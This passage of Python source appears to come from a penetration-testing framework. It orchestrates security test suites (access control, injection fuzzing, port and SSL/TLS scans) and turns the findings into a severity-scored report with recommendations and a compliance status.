    async def execute_test_suite(self, suite_id: str, target_config: dict[str, Any]) -> dict[str, Any]:
        """Execute a penetration test suite."""

        if suite_id not in self.test_suites:
            raise SecurityError(f"Test suite not found: {suite_id}")

        suite = self.test_suites[suite_id]
        execution_start = datetime.utcnow()

        execution_result = {
            "suite_id": suite_id,
            "suite_name": suite.name,
            "start_time": execution_start.isoformat(),
            "target_config": target_config,
            "test_results": [],
            "summary": {
                "total_tests": len(suite.tests),
                "passed": 0,
                "failed": 0,
                "errors": 0,
                "skipped": 0
            },
            "findings": [],
            "performance_impact": {}
        }

        # Execute tests
        if suite.parallel_execution:
            # Execute tests in parallel
            tasks = []
            for test in suite.tests:
                task = asyncio.create_task(
                    self._execute_security_test(test, target_config, suite_id)
                )
                tasks.append(task)

            test_results = await asyncio.gather(*tasks, return_exceptions=True)
        else:
            # Execute tests sequentially
            test_results = []
            for test in suite.tests:
                result = await self._execute_security_test(test, target_config, suite_id)
                test_results.append(result)

        # Process results
        for result in test_results:
            if isinstance(result, Exception):
                execution_result["summary"]["errors"] += 1
                continue

            # Type guard: ensure result is TestResult
            if isinstance(result, TestResult):
                execution_result["test_results"].append(result)
                execution_result["findings"].extend(result.findings)

                if result.status == "passed":
                    execution_result["summary"]["passed"] += 1
                elif result.status == "failed":
                    execution_result["summary"]["failed"] += 1
                elif result.status == "error":
                    execution_result["summary"]["errors"] += 1
                elif result.status == "skipped":
                    execution_result["summary"]["skipped"] += 1
            else:
                execution_result["summary"]["errors"] += 1

        # Calculate execution time
        execution_end = datetime.utcnow()
        execution_result["end_time"] = execution_end.isoformat()
        execution_result["duration_seconds"] = (execution_end - execution_start).total_seconds()

        # Update performance metrics
        self.performance_metrics["tests_executed"] += execution_result["summary"]["total_tests"]
        self.performance_metrics["vulnerabilities_found"] += len(execution_result["findings"])
        self.performance_metrics["total_test_time"] += int(execution_result["duration_seconds"])
        self.performance_metrics["average_test_time"] = int(
            self.performance_metrics["total_test_time"] /
            max(self.performance_metrics["tests_executed"], 1)
        )

        return execution_result

    async def _execute_security_test(self, test: SecurityTest,
                                   target_config: dict[str, Any],
                                   suite_id: str) -> TestResult:
        """Execute a single security test."""

        start_time = datetime.utcnow()
        findings = []
        logs = []
        status = "passed"

        try:
            # Check prerequisites
            if not self._check_prerequisites(test.prerequisites, target_config):
                return TestResult(
                    test_id=test.test_id,
                    suite_id=suite_id,
                    status="skipped",
                    start_time=start_time,
                    end_time=datetime.utcnow(),
                    duration_seconds=0,
                    findings=[],
                    performance_impact={},
                    logs=["Prerequisites not met"]
                )

            # Execute test based on type
            if test.test_function == "test_access_control":
                findings = await self._test_access_control(target_config)
            elif test.test_function == "test_cryptography":
                findings = await self._test_cryptography(target_config)
            elif test.test_function == "test_injection":
                findings = await self._test_injection(target_config)
            elif test.test_function == "scan_ports":
                findings = await self._scan_ports(target_config)
            elif test.test_function == "test_ssl_tls":
                findings = await self._test_ssl_tls(target_config)
            else:
                logs.append(f"Unknown test function: {test.test_function}")
                status = "error"

            # Determine test status
            if findings:
                critical_findings = [f for f in findings if f.severity == TestSeverity.CRITICAL]
                high_findings = [f for f in findings if f.severity == TestSeverity.HIGH]

                if critical_findings:
                    status = "failed"
                elif high_findings:
                    status = "failed"
                else:
                    status = "passed"  # Only low/medium findings

        except Exception as e:
            status = "error"
            logs.append(f"Test execution error: {str(e)}")

        end_time = datetime.utcnow()
        duration = (end_time - start_time).total_seconds()

        return TestResult(
            test_id=test.test_id,
            suite_id=suite_id,
            status=status,
            start_time=start_time,
            end_time=end_time,
            duration_seconds=duration,
            findings=findings,
            performance_impact={"execution_time": duration},
            logs=logs
        )

    def _check_prerequisites(self, prerequisites: list[str],
                           target_config: dict[str, Any]) -> bool:
        """Check if test prerequisites are met."""
        for prereq in prerequisites:
            if prereq == "running_web_app":
                if not target_config.get("web_url"):
                    return False
            elif prereq == "network_accessible":
                if not target_config.get("host"):
                    return False
            elif prereq == "ssl_enabled":
                url = target_config.get("web_url", "")
                if not url.startswith("https://"):
                    return False
            elif prereq == "database_connected":
                if not target_config.get("has_database", False):
                    return False

        return True

    async def _test_access_control(self, target_config: dict[str, Any]) -> list[TestFinding]:
        """Test access control implementation."""
        web_url = target_config.get("web_url")
        if not web_url:
            return []

        return await self.vulnerability_scanner._test_authorization_flaws(web_url)

    async def _test_cryptography(self, target_config: dict[str, Any]) -> list[TestFinding]:
        """Test cryptographic implementations."""
        findings = []

        web_url = target_config.get("web_url")
        if web_url:
            findings.extend(await self.vulnerability_scanner._test_security_headers(web_url))

        host = target_config.get("host")
        if host:
            findings.extend(await self.network_scanner._scan_ssl_configuration(host))

        return findings

    async def _test_injection(self, target_config: dict[str, Any]) -> list[TestFinding]:
        """Test for injection vulnerabilities."""
        web_url = target_config.get("web_url")
        if not web_url:
            return []

        findings = await self.vulnerability_scanner._test_injection_vulnerabilities(web_url)

        # Add fuzzing tests
        endpoints = target_config.get("test_endpoints", ["/api/search", "/search"])
        parameters = target_config.get("test_parameters", ["q", "id", "search"])

        for endpoint in endpoints:
            fuzz_findings = await self.fuzzing_engine.fuzz_endpoint(
                web_url, endpoint, parameters, ["sql_injection", "xss", "command_injection"]
            )
            findings.extend(fuzz_findings)

        return findings

    async def _scan_ports(self, target_config: dict[str, Any]) -> list[TestFinding]:
        """Scan for open ports."""
        host = target_config.get("host")
        if not host:
            return []

        port_range = target_config.get("port_range", (1, 1000))
        return await self.network_scanner._scan_open_ports(host, port_range)

    async def _test_ssl_tls(self, target_config: dict[str, Any]) -> list[TestFinding]:
        """Test SSL/TLS configuration."""
        host = target_config.get("host")
        port = target_config.get("ssl_port", 443)
        if not host:
            return []

        return await self.network_scanner._scan_ssl_configuration(host, port)

    def generate_security_report(self, test_results: list[dict[str, Any]]) -> dict[str, Any]:
        """Generate comprehensive security assessment report."""

        all_findings = []
        total_tests = 0
        total_duration = 0

        for result in test_results:
            all_findings.extend(result.get("findings", []))
            total_tests += result.get("summary", {}).get("total_tests", 0)
            total_duration += result.get("duration_seconds", 0)

        # Categorize findings by severity
        severity_counts = {
            TestSeverity.CRITICAL: 0,
            TestSeverity.HIGH: 0,
            TestSeverity.MEDIUM: 0,
            TestSeverity.LOW: 0,
            TestSeverity.INFO: 0
        }

        for finding in all_findings:
            if hasattr(finding, 'severity'):
                severity_counts[finding.severity] += 1

        # Calculate risk score
        risk_score = (
            severity_counts[TestSeverity.CRITICAL] * 10 +
            severity_counts[TestSeverity.HIGH] * 7 +
            severity_counts[TestSeverity.MEDIUM] * 4 +
            severity_counts[TestSeverity.LOW] * 2 +
            severity_counts[TestSeverity.INFO] * 1
        )

        # Determine overall security posture
        if severity_counts[TestSeverity.CRITICAL] > 0:
            security_posture = "Critical - Immediate action required"
        elif severity_counts[TestSeverity.HIGH] > 0:
            security_posture = "High Risk - Action required soon"
        elif severity_counts[TestSeverity.MEDIUM] > 2:
            security_posture = "Medium Risk - Plan remediation"
        else:
            security_posture = "Good - Monitor and maintain"

        return {
            "report_id": f"pentest_{secrets.token_hex(8)}",
            "generated_at": datetime.utcnow().isoformat(),
            "summary": {
                "total_tests_executed": total_tests,
                "total_findings": len(all_findings),
                "total_duration_seconds": total_duration,
                "risk_score": risk_score,
                "security_posture": security_posture
            },
            "findings_by_severity": {
                "critical": severity_counts[TestSeverity.CRITICAL],
                "high": severity_counts[TestSeverity.HIGH],
                "medium": severity_counts[TestSeverity.MEDIUM],
                "low": severity_counts[TestSeverity.LOW],
                "info": severity_counts[TestSeverity.INFO]
            },
            "top_vulnerabilities": sorted(
                [asdict(f) for f in all_findings if hasattr(f, 'severity')],
                key=lambda x: ["info", "low", "medium", "high", "critical"].index(x["severity"]),
                reverse=True
            )[:10],
            "recommendations": self._generate_security_recommendations(all_findings),
            "compliance_status": self._assess_compliance(all_findings),
            "test_coverage": {
                "categories_tested": len({f.category for f in all_findings if hasattr(f, 'category')}),
                "components_tested": len({f.affected_component for f in all_findings if hasattr(f, 'affected_component')})
            }
        }

    def _generate_security_recommendations(self, findings: list[TestFinding]) -> list[str]:
        """Generate security recommendations based on findings."""
        recommendations = []

        # Count findings by category
        category_counts = {}
        for finding in findings:
            if hasattr(finding, 'category'):
                category = finding.category.value if hasattr(finding.category, 'value') else str(finding.category)
                category_counts[category] = category_counts.get(category, 0) + 1

        # Generate recommendations based on most common issues
        if category_counts.get("injection", 0) > 0:
            recommendations.append("Implement comprehensive input validation and use parameterized queries")

        if category_counts.get("broken_access_control", 0) > 0:
            recommendations.append("Review and strengthen access control mechanisms")

        if category_counts.get("cryptographic_failures", 0) > 0:
            recommendations.append("Update cryptographic implementations and disable weak protocols")

        if category_counts.get("security_misconfiguration", 0) > 0:
            recommendations.append("Review security configurations and implement security headers")

        # General recommendations
        recommendations.extend([
            "Conduct regular security assessments and penetration testing",
            "Implement security monitoring and incident response procedures",
            "Provide security training to development teams",
            "Establish a vulnerability management program"
        ])

        return recommendations[:8]  # Limit to top 8 recommendations

    def _assess_compliance(self, findings: list[TestFinding]) -> dict[str, Any]:
        """Assess compliance with security standards."""
        compliance_status = {
            "OWASP_Top_10": "PASS",
            "NIST_Cybersecurity": "PASS",
            "ISO_27001": "PASS"
        }

        # Check for critical compliance issues
        critical_findings = [f for f in findings if hasattr(f, 'severity') and f.severity == TestSeverity.CRITICAL]
        high_findings = [f for f in findings if hasattr(f, 'severity') and f.severity == TestSeverity.HIGH]

        if critical_findings:
            compliance_status["OWASP_Top_10"] = "FAIL"
            compliance_status["NIST_Cybersecurity"] = "FAIL"
            compliance_status["ISO_27001"] = "FAIL"
        elif len(high_findings) > 3:
            compliance_status["OWASP_Top_10"] = "PARTIAL"
            compliance_status["NIST_Cybersecurity"] = "PARTIAL"

        return compliance_status

    def get_framework_status(self) -> dict[str, Any]:
        """Get penetration testing framework status."""
        return {
            "available_test_suites": len(self.test_suites),
            "test_suites": list(self.test_suites.keys()),
            "performance_metrics": self.performance_metrics,
            "components": {
                "vulnerability_scanner": "active",
                "network_scanner": "active",
                "fuzzing_engine": "active"
            }
        }
